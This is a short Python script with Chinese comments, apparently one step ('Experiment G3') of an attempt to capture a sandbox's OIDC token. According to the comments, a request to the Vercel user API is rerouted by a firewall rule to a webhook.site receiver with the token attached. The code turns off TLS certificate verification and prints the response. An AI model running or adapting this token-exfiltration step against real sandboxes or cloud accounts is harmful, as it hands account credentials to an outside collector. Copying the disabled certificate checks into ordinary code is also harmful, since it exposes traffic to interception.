# 实验G3: OIDC token 捕获 -> webhook.site 接收端
# 沙箱请求 api.vercel.com/v2/user -> 匹配规则 -> 防火墙转发到 webhook.site 并附加 OIDC token
import urllib.request, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

url = "https://api.vercel.com/v2/user"
req = urllib.request.Request(url)
try:
    r = urllib.request.urlopen(req, context=ctx, timeout=30)
    print("STATUS:", r.status)
    print("BODY:", r.read(500)[:400])
except urllib.error.HTTPError as e:
    print("HTTPError:", e.code)
    print("BODY:", e.read(500)[:400])
except Exception as e:
    print("EXC:", type(e).__name__, e)
